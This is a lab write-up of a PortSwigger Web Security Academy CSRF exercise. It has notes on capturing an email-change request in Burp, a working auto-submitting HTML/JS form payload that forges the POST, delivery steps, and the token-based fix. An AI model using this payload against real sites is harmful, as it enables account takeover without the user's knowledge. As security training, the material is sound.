# CSRF (Cross-Site Request Forgery)

---

## CSRF vulnerability with no defenses

**Approach:** Log in as `wiener:peter`, go to account settings, change the email through the normal UI, and capture the request in Burp Proxy/Repeater.

→ Confirm the request: `POST /my-account/change-email`, body `email=<value>` (form-urlencoded), auth via session cookie only — no second token parameter present anywhere in the body.

→ Build an HTML PoC with a form targeting the real lab host/path:
```html
<form id="csrf-form" action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>
    document.getElementById("csrf-form").submit();
</script>
```

→ Host this on the exploit server (paste into "Body", Store). Auto-submit via JS means the victim needs zero interaction beyond loading the page.

→ "View exploit" while logged in as the victim to confirm the email changes without manual submission, then "Deliver exploit to victim" to solve the lab.

**Why:** No CSRF token on `/my-account/change-email` → auto-submitting form on attacker's exploit server forges the POST → victim's browser auto-attaches their real session cookie cross-origin → fix: bind a unique, unpredictable, session-tied CSRF token to the form and validate it server-side on every state-changing request.

**Tools:** Burpsuite (Proxy/Repeater), PortSwigger exploit server, hand-written HTML/JS.

---
